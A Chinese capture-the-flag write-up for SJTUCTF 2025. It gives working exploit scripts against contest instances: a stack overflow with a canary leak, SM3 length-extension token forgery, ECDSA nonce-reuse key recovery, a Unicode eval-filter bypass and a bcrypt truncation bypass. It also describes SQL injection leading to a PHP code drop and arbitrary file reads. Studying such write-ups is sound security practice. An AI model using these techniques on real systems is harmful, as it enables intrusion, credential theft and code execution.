---
counter: True
statistic: true
---

# SJTUCTF 2025

!!! abstract
    本来说去年最后一场Hackergame后就不打了，结果今年又没忍住，这次是真的最后一次。最后几天因为清明摆烂没做题，最后排名没有特别好看sad，所以本来不想写WP的，但想着既然做了就简单写写吧。

## Pwn

### Guess Master

先根据时间 seed 完成猜测数字，然后再溢出 Canary， 最后完成栈溢出。

???+ done "exp"
    ```python
    from pwn import *
    from ctypes import CDLL

    local = ELF('./pwn')
    libc = CDLL("libc.so.6")

    # p = process('./pwn')
    p = remote("instance.penguin.0ops.sjtu.cn", 18504)
    now_time = libc.time(0) + 0x6e
    libc.srand(now_time)

    for _ in range(100):
      num = libc.rand()
      p.recvuntil('我想的是多少？\n'.encode())
      p.sendline(str(num).encode())

    pad = 'a'*33*8
    print(pad)
    p.sendline(pad.encode())
    p.recvuntil('你的愿望是：'.encode())
    can = p.recvuntil('。嗯……换个愿望。'.encode())
    suffix = len('。嗯……换个愿望。'.encode())
    can = can.split(b'\n')[1][:-suffix]
    print(can, len(can))
    payload = pad.encode() + b'\x00' + can + b'\x00\x00' + b'\x97'
    p.sendline(payload)
    p.interactive()
    ```

## Reverse

### Are You Ready

这是一道套娃，扒了半天后是一个 C# 程序的逆向，就很常规了

??? done "exp"
    ```python
    class Composition:
      def __init__(self):
        self.states = [0] * 7
        self.instruments = [
          self.Piano,
          self.Guitar,
          self.Saxophone,
          self.Violin,
          self.Cello,
          self.Drum,
          self.Flute,
          self.Harp
        ]
        self.STARTED = 1
        self.PROCEDING = 2
        self.FINISHED = 3
        self.PRELUDE = 1
        self.SOLO1 = 2
        self.DUET1 = 3
        self.TRIO1 = 4
        self.SOLO2 = 5
        self.DUET2 = 6
        self.TRIO2 = 7
        self.FINALE = 8
        self.bit = 1
          
      def Piano(self, key, value):
        self.states[0], self.states[1] = self.states[1], self.states[0]

      def Guitar(self, key, value):
        self.states[1], self.states[2] = self.states[2], self.states[1] + self.states[2]

      def Violin(self, key, value):
        self.states[2], self.states[3] = self.states[3], self.states[2] - self.states[3]

      def Cello(self, key, value):
        self.states[3], self.states[4] = self.states[4], self.states[3] ^ self.states[4]

      def Drum(self, key, value):
        self.states[4], self.states[5] = self.states[5], ~(self.states[4] ^ self.states[5])

      def Flute(self, key, value):
        shifted_val = (self.states[5] >> 32 - key) & (0xFFFFFFFF >> 32 - key)
        rotated_val = (self.states[5] << key) | shifted_val
        self.states[5], self.states[6] = self.states[6], rotated_val

      def Harp(self, key, value):
        shifted_val = (self.states[6] >> 32 - value) & (0xFFFFFFFF >> 32 - value)
        print(bin(shifted_val), bin(self.states[6]), key)
        rotated_val = (self.states[6] << value) | shifted_val
        self.states[6], self.states[0] = self.states[0], rotated_val

      def Saxophone(self, key, value):
        temp = self.states[0]
        self.states[0] = self.states[1]
        self.states[1] = self.states[2]
        self.states[2] = self.states[3]
        self.states[3] = self.states[4]
        self.states[4] = self.states[5]
        self.states[5] = self.states[6]
        self.states[6] = temp

      def GetHash(self, A_1, A_2):
        num = self.secret + (A_1 << A_2) - (A_2 << A_1)
        self.secret = (num ^ (self.secret >> self.bit)) & 0xFFFFFFFF
        return self.secret

      def GoOn(self, A_1, A_2):
        num = self.GetHash(A_1, A_2) % len(self.instruments)
        self.instruments[num](A_1, A_2)

      def Initialize(self):
        self.states[0] = 503508867
        self.states[1] = -744629298
        self.states[2] = -794976596
        self.states[3] = 1905074788
        self.states[4] = -1713215966
        self.states[5] = 1240041635
        self.states[6] = -1999964094
        self.secret = 424019476

      def ToString(self):
        span = []
        for i in range(7):
          span.append((self.states[i] ^ (self.secret + i)) & 0xFFFFFFFF)
        tmp = [hex(val)[2:] for val in span]
        print(tmp)
        bit = []
        for val in tmp:
          t = []
          for i in range(0, len(val), 2):
            t.append(val[i:i+2])
          bit += t[::-1]
        print(bit)
        bit = [chr(int(val, 16)) for val in bit]
        return ''.join(bit)

      def Prelude(self):
        self.GoOn(self.STARTED, self.PRELUDE)
        self.GoOn(self.PROCEDING, self.PRELUDE)
        self.GoOn(self.FINISHED, self.PRELUDE)
        self.Solo1()

      def Solo1(self):
        self.GoOn(self.STARTED, self.SOLO1)
        self.GoOn(self.PROCEDING, self.SOLO1)
        self.GoOn(self.FINISHED, self.SOLO1)
        self.Duet1()

      def Duet1(self):
        self.GoOn(self.STARTED, self.DUET1)
        self.GoOn(self.PROCEDING, self.DUET1)
        self.GoOn(self.FINISHED, self.DUET1)
        self.Trỉo1()

      def Trỉo1(self):
        self.GoOn(self.STARTED, self.TRIO1)
        self.GoOn(self.PROCEDING, self.TRIO1)
        self.GoOn(self.FINISHED, self.TRIO1)
        self.Solo2()

      def Solo2(self):
        self.GoOn(self.STARTED, self.SOLO2)
        self.GoOn(self.PROCEDING, self.SOLO2)
        self.GoOn(self.FINISHED, self.SOLO2)
        self.Duet2()

      def Duet2(self):
        self.GoOn(self.STARTED, self.DUET2)
        self.GoOn(self.PROCEDING, self.DUET2)
        self.GoOn(self.FINISHED, self.DUET2)
        self.Trio2()

      def Trio2(self):
        self.GoOn(self.STARTED, self.TRIO2)
        self.GoOn(self.PROCEDING, self.TRIO2)
        self.GoOn(self.FINISHED, self.TRIO2)
        self.Finale()

      def Finale(self):
        self.GoOn(self.STARTED, self.FINALE)
        self.GoOn(self.PROCEDING, self.FINALE)
        self.GoOn(self.FINISHED, self.FINALE)
        self.ShowFlag()

      def ShowFlag(self):
        print(self.ToString())

    composition = Composition()
    composition.Initialize()
    composition.Prelude()
    ```

### Noisy Cat 1/2

逆向部分占的内容很少，大致就是根据 0 和 1，分别生成频率为 40 和 21 的正弦波，采样点是 40 一个周期，因此直接 FFT 求频谱就好了。第二题就是额外前后加了些噪声无用信息。，以及计算的时候给一些容错。

???+ done "exp"
    ```python
    from scipy.fftpack import fft

    import wave
    import numpy as np

    def find_zero_crossings_time(wav_file_path):
      zero_crossing_times = []

      with wave.open(wav_file_path, 'rb') as wf:
        sample_width = wf.getsampwidth()   
        num_frames = wf.getnframes()     

        audio_data = wf.readframes(num_frames)
        if sample_width == 1:
          audio_array = np.frombuffer(audio_data, dtype=np.int8)
        elif sample_width == 2:
          audio_array = np.frombuffer(audio_data, dtype=np.int16)
        elif sample_width == 4:
          audio_array = np.frombuffer(audio_data, dtype=np.int32)
        else:
          print(f"不支持的采样宽度: {sample_width} 字节")
          return []
      return zero_crossing_times, audio_array

    if __name__ == '__main__':
      wav_file = 'noisycat/NoisyCat2.wav' 
      times, arr = find_zero_crossings_time(wav_file)

      bit = []
      print(len(arr))
      for i in range(0, len(arr)-40+1, 40):
        data = arr[i:i+40]
        df = np.abs(fft(data))
        y = df[range(int(40/2))]/40
        index = np.argmax(y)
        if index == 2:
          bit.append(0)
        elif index in [0,1]:
          bit.append(1)

      bit = bit[2:-2]
      print(len(bit))
      
      music = []
      for i in range(0, len(bit)-10+1, 10):
        data = bit[i:i+10]
        music.append(''.join(map(str,data[1:-1][::-1])))
      
      music = [int(i,2) for i in music]
      print(music, ''.join([chr(i) for i in music]))
    ```

### Expr-* 系列

Warmup 这题简单读懂题目条件就好了，手撕一下就能过了。

???+ done "exp"
    \> a a m

    \> b b c p d b b c p d x
    
    \> c b c p d c b c p d x

Geom0 这题条件多了一些，用`SymPy`库来辅助求解也非常快。

???+ done "题解"
    \> 0 a m

    \> b

    \> c

## Crypto

### ezCrypt

先二进制转16进制，再 decode 出来，根据文本提示，先 base64 解码上文，然后根据一些单词完成字母替换后，将后一段文字进行 IPV6 的 base85 解码，然后就是一个常规的 RSA 解码，算一下就好了。

### Notes

sm3 的长度扩展攻击

??? done "题解"
    ```python
    import requests

    url = "http://xqwkj7pf3hqpxx7r.instance.penguin.0ops.sjtu.cn:18080/"
    username = "tomo0"
    password = "penguins"
    org = "GO"
    new_org = "CRYCRY"

    from gmssl.func import bytes_to_list, list_to_bytes
    from gmssl import sm3
    import base64, os, random
    import struct


    from my_sm3 import sm3_hash as my_sm3

    def generate_guess_hash(old_hash, secret_len, append_m):
        vectors = []
        message = ""
        for r in range(0, len(old_hash), 8):
            vectors.append(int(old_hash[r:r + 8], 16))

        if secret_len > 64:
            for i in range(0, int(secret_len / 64) * 64):
                message += 'a'
        for i in range(0, secret_len % 64):
            message += 'a'
        message = bytes_to_list(bytes(message, encoding='utf-8'))
        message = padding(message)
        message.extend(bytes_to_list(bytes(append_m, encoding='utf-8')))
        return my_sm3(message, vectors)


    pad_str = ""
    pad = []

    def padding(msg):
      mlen = len(msg)
      msg.append(0x80)
      mlen += 1
      tail = mlen % 64
      range_end = 56
      if tail > range_end:
        range_end = range_end + 64
      for i in range(tail, range_end):
        msg.append(0x00)
      bit_len = (mlen - 1) * 8
      msg.extend([int(x) for x in struct.pack('>q', bit_len)])
      for j in range(int((mlen - 1) / 64) * 64 + (mlen - 1) % 64, len(msg)):
        global pad
        pad.append(msg[j])
        global pad_str
        pad_str += str(hex(msg[j]))
      return msg


    def b64_decode(value: str) -> str:
      padding = 4 - (len(value) % 4)
      value = value + ("=" * padding)
      result = base64.urlsafe_b64decode(value)
      return result.decode("latin1")


    def b64_encode(value: str) -> str:
      encoded = base64.urlsafe_b64encode(str.encode(value, "latin1"))
      result = encoded.rstrip(b"=")
      return result.decode("latin1")

    def sign_token(username: str, password: str, org: str, secret) -> str:
      payload = f"{username}.{org}"
      params = [secret.hex(), password, payload]
      payload_to_sign = ".".join(params)
      # We proudly use Chinese national standard SM3 to sign our token
      signature = sm3.sm3_hash(bytes_to_list(payload_to_sign.encode()))
      print("Issued:", signature, "for", payload_to_sign)
      lst = [payload, signature]
      ret = ".".join([b64_encode(x) for x in lst])
      return ret

    def verify_token(token: str, secret):
      assert token.count(".") == 1
      payload, signature = token.split(".")
      payload = b64_decode(payload)
      signature = b64_decode(signature)
      params = [secret.hex(), password, payload]
      payload_to_sign = ".".join(params)
      if sm3.sm3_hash(bytes_to_list(payload_to_sign.encode("latin1"))) != signature:
        raise Exception("Invalid sign, maybe expired")
      try:
        params = payload.split(".")
        username = params[0]
        org = params[-1]
        assert isinstance(username, str)
        assert isinstance(org, str)
      except Exception as e:
        raise Exception("Invalid payload")
      return {"username": username, "org": org}

    def get_token():
      data = {
        "username": "tomo0",
        "password": "penguins"
      }
      response = requests.post(url + "login", data=data)

      return response.url.split("=")[-1]

    rs = os.urandom(random.randint(10, 20))


    old_token = sign_token(username, password, org, rs)
    _, sig = old_token.split(".")

    payload = f".{password}.{username}.{org}"
    secret_len = len(payload) + len(rs.hex())
    secret_hash = b64_decode(sig)
    append_payload = f".{new_org}"

    guess_hash = generate_guess_hash(secret_hash, secret_len, append_payload)
    new_msg = bytes_to_list((rs.hex()+payload).encode('latin1'))
    new_msg.extend(pad)
    new_msg.extend(bytes_to_list(append_payload.encode('latin1')))
    new_msg_str = list_to_bytes(new_msg).decode('latin1')
    print(new_msg_str.encode('latin1'))
    verify_hash = sm3.sm3_hash(bytes_to_list(new_msg_str.encode('latin1')))

    tou = f"{username}.{org}{list_to_bytes(pad).decode('latin1')}.{new_org}"

    print("guess_hash:", guess_hash)
    print("verify_hash:", verify_hash)

    guess_token = b64_encode(tou) + "." + b64_encode(guess_hash)
    print(verify_token(guess_token, rs))

    old_token = get_token()
    print(old_token)
    _, sig = old_token.split(".")

    secret_hash = b64_decode(sig)
    for i in range(9, 22):
      pad = []
      rs = os.urandom(i)
      secret_len = len(payload) + len(rs.hex())
      guess_hash = generate_guess_hash(secret_hash, secret_len, append_payload)
      tou = f"{username}.{org}{list_to_bytes(pad).decode('latin1')}.{new_org}"
      new_token = b64_encode(tou) + "." + b64_encode(guess_hash)
      
      res = requests.get(url + f"note?token={new_token}")
      print(res.text)
    ```

### AnatahEtodokuSakebi

这题需要逆向一下加密过程，草稿纸一下子找不到了，反正就是因为 pad 长度过长，所以我们需要暴力遍历其中一个部分是分组长度减去 pad 长度，时间也在可接受范围内。

??? done "题解"
    ```python
    from Crypto.Cipher import AES
    import hashlib, time

    key = b"UZhyYC6oiNH2IDZE"
    iv = b"sjtuctf20250oops"

    def get_cypher(key, iv, encd):
      cypher = AES.new(key, AES.MODE_CBC, iv)
      decd = b""
      index = 0
      while index < len(encd):
        decd += cypher.decrypt(encd[index : index + 16])
        index += 16
      return cypher

    def calc(tmp, key, iv, encd, target):
      for i in range(255):
        for j in range(255):
          for k in range(255):
            guess= bytes([i,j,k])
            payload = guess + tmp
            res = AES.new(key, AES.MODE_ECB).encrypt(payload)
            cypher = get_cypher(key, iv, encd)
            res = cypher.decrypt(res)
            if res[:3] == target:
              print("guess: ", guess)
              return guess

    def get_md5(s):
      md = hashlib.md5()
      md.update(s.encode('utf-8'))
      return md.hexdigest()

    def md5_calc(text):
      code = 0
      while True:
        md5 = get_md5(text+str(code))
        if md5[0:5] == "00000":
          print("code:", code, "md5:", md5)
          return code
        code += 1

    class AESCryptService:
      key = b"UZhyYC6oiNH2IDZE"
      iv = b"sjtuctf20250oops"
      BLOC = 16

      def decrypt(self, data: str):
        data = bytes.fromhex(data)
        pad = 0
        key = self.key
        iv = self.iv
        BLOC = self.BLOC
        if (len(data) % BLOC) > 0:
          pad = BLOC - (len(data) % BLOC)
          secondToLast = data[len(data) - 2 * BLOC + pad : len(data) - BLOC + pad]
          dec = AES.new(key, AES.MODE_ECB).decrypt(secondToLast)
          data += bytes(dec[len(dec) - pad : len(dec)])
          data = (
            data[: len(data) - 2 * BLOC]
            + data[len(data) - BLOC :]
            + data[len(data) - 2 * BLOC : len(data) - BLOC]
          )

        index = 0
        decd = b""
        cipher = AES.new(key, AES.MODE_CBC, iv)
        while index < len(data):
          decd += cipher.decrypt(data[index : index + BLOC])
          index += BLOC
        # print(len(decd), pad, decd)
        if pad != 0:
          decd = decd[: len(decd) - pad]
        return decd
      
      
      def encrypt(self, plaintext: str):
        data = plaintext.encode("utf-8")
        pad = 0
        key = self.key
        iv = self.iv
        BLOC = self.BLOC

        index = 0
        encd = b""
        cipher = AES.new(key, AES.MODE_CBC, iv)
        while index < len(data) - BLOC * 2:
          encd += cipher.encrypt(data[index : index + BLOC])
          index += BLOC
        
        last2 = data[index : index + BLOC]
        last = data[index + BLOC : index + BLOC*2]

        if (len(data) % BLOC) > 0:
          pad = BLOC - (len(data) % BLOC)
          enlast2 = cipher.encrypt(last2)
          tmp = enlast2[-pad:]
          # ecb_e(x+tmp) == cbc_e(last+y) == enlast
          guess = calc(tmp, key, iv, enlast2, last)
          # print(tmp.hex())
          # print((encd+enlast2).hex())
          t1 = AES.new(key, AES.MODE_ECB).encrypt(guess+tmp)

          encd += t1 + enlast2

        return encd[:-pad].hex() # Return hex representation of ciphertext

    timestamp = int(time.time())
    s = "Give me! It's MyFLAG!!!!!"

    st = s + str(int(timestamp // 600 * 600))

    print(st)
    import requests

    url = r"http://9c7ctp74txqky7jh.instance.penguin.0ops.sjtu.cn:18080"

    crypt_service = AESCryptService()
    # data = crypt_service.encrypt(st)
    data = "974214ccb922648789c20c8130b324a3f3a0d62ec70eec75a5dc2e796bf5d7493f765d"
    print(f"Encrypted: {data}")
    decrypted_text = crypt_service.decrypt(data)
    print(f"Decrypted: {decrypted_text}")

    now = int(time.time())
    new_time = str(now)
    print(now, now - timestamp, int(now//600*600))

    md5_str = data + new_time
    code = md5_calc(md5_str)

    html = requests.post(
      url + "/flag",
      data={
        "data": data,
        "code": code,
        "timestamp": new_time,
      },
    )

    print(html.text, html.status_code)
    ```

### KillerECC

这道是 js 的 elliptic 包存在的一个漏洞，如果字符串前面多了个`-`，则会生成一样的`r`，不同的`s`，给了攻击可利用的点。

???+ done "exp"
    ```python
    from ecdsa import SECP256k1
    from ecdsa.numbertheory import inverse_mod


    def recover_private_key(h1, h2, s1, s2, r1, r2, n):
      assert r1 == r2, "No ECDSA nonce reuse detected."
      return ((s2 * h1 - s1 * h2) * inverse_mod(r1 * (s1 - s2), n)) % n

    if __name__ == "__main__":
      m1 = b""
      m1 = bytes(m1)
      m2 = b"-"+m1
      k = 0x8c6fc892ae543f0a52320bb6a070768bf6a497fb093ed66e496b1cad30a6ac25
      n = SECP256k1.order

      h2 = "-73cc0def40f5a45c4ff832ef13f48ef3420e7e54f317ee2a66b8775f4821c56"
      h1 = "73cc0def40f5a45c4ff832ef13f48ef3420e7e54f317ee2a66b8775f4821c56"

      r1 = 60354904809511614058507625639522156370355143721987794549383259310069641924788
      r2 = r1
      s1 = 23081588448820285967890966960272082348333448540161276095018249549014911909703
      s2 = 111174569511178555835177030688249384856967345598130723901413672824818338714294

      recovered_private_key = recover_private_key(
        int(h1, base=16), int(h2, base=16), s1, s2, r1, r2, n
      )
      print(f"Recovered private key: {hex(recovered_private_key)}")  
    ```

## Misc

### deleted

根据 hint ，通过删库代码可以发现，数据库采用了`wal`的日志存储方式，那么在其目录下会有`*-shm`、`*-wal`两个文件，我们直接下载这两个文件，发现假设成立，然后对`*-wal`文件进行解析，通过`string`命令就能找到 flag

### Inaudible

这道题是把频谱图转换成音频文件，图省力发现有现成的轮子，那就一下子就出来了。

> Zero day vulnerabilities

### TIME&POWER

首先是一个密码爆破，有时间延迟，所以直接暴力破解就好了

> Password: aaaaaaaaaadmin

登录后获得一个`data.npz`的文件，对其进行分析，看到矩阵和`input`有对应关系，通过画图观察，知道需要找一个方差最大曲线里最小值的那个点，然后找到其对应字符即可。

???+ done "题解"
    ```python
    import numpy as np

    data = np.load('time_power/data.npz')
    ab = list(data['input'])
    ab = [str(i) for i in ab]
    c = list(r'abcdefghijklmnopqrstuvwxyz0123456789_{}')
    iid = list(data['input_id'])
    iid = [int(i) for i in iid]
    power = data['power']

    s = ''
    for i in range(27):
      t = power[39*i:39*(i+1)]
      t_std = power[39*i:39*(i+1)].std(axis=0)
      index = np.where(t_std==t_std.max())[0][0]
      sel = t[:,index]
      index = np.where(sel==sel.min())[0][0]
      s += c[index]
    print(s)
    ```

### IP Hunter 24

这道题好像没什么捷径，就是爬取公开的代理库，然后自动代理访问等待即可。

### PyCalc

这道题很简单，就是利用`python`对`Unicode`的等价处理，实现字符的绕过。

???+ done "题解"
    ```python
    import requests

    url = r"http://78hbypemcpqg4w97.instance.penguin.0ops.sjtu.cn:18080/"

    payload = "𝔢ˣ𝔢𝔠()"
    payload = "𝔬𝔭𝔢𝔫(𝔠ʰʳ(47)+𝔠ʰʳ(102)+𝔠ʰʳ(108)+𝔠ʰʳ(97)+𝔠ʰʳ(103)).ʳ𝔢𝔞𝔡()"
    print(payload)

    p = requests.get(url+"calc", params={"expr": payload})

    print(p.text)
    ```

## Web

### Secret Config

这道题根据提示，首先在`/doc`下查看所有 api，发现知识库这里存在文件读写，试了一下发现有目录穿越的漏洞，通过读`config`相关文件发现 Secret 以 Module 的形式导入的，因此直接读取文件名下的`__init__.py`文件即可。

### Emergency

这道题利用`Vite@6.2.2`的任意文件读取漏洞，使用`@fs`即可完成任意文件读取获得flag。

### rickroll

因为使用了`PASSWORD_BCRYPT`导致在密码验证的时候只有前 72 个字符生效，因此绕过非常简单。

???+ done "exp"
    ```python
    import requests

    url = r"http://g6gexhfgyxcp8fvg.instance.penguin.0ops.sjtu.cn:18080"

    pwd = "Never gonna give you up,Never gonna let you down,Never gonna run around "
    print(len(pwd))
    payload = pwd

    p = requests.get(url+'?input='+payload)

    print(p.text)
    ```

[Refer:password-hash](https://www.php.net/manual/en/function.password-hash.php)

### SmartGrader

这道题的注入点其实很容易找到，就是常见的'ScriptEngine.eval'，但是对长度进行了限制，发现命令无法直接注入，但是由于题目环境是联网环境，所以我们可以利用`load`函数将外部的`js`文件加载进来，然后执行，后面就很常规了。

### Gradient

这道题是 css 的注入，原理很简单，根据[这篇文章](https://blog.huli.tw/2022/09/29/css-injection-1/)，很容易知道该怎么实现，但是我由于太着急，直接上了文章中任意文本读取的方法，发现好像在 headless Chrome 中不生效。后来只能退而求其次，根据各个`span`的颜色不同，且 7 个一循环，通过一些遍历获得flag。

### realLibraryManager

这道题一开始卡住了，后来发现这个框架是开源的，于是拿了一个默认账号就能登录了，登录后发现在查询图书的地方存在 SQL 注入，那直接把数据库爆了，由于密码是`md5`存储的，所以很简单就拿到了管理员账号权限，然后发现有一个地方可以将数据库保存下来，那就很简单把`php`代码植入到图书的简介中，然后把数据库保存到可以访问的目录，那么就可以实现任意代码执行，获得`shell`后就拿到flag了。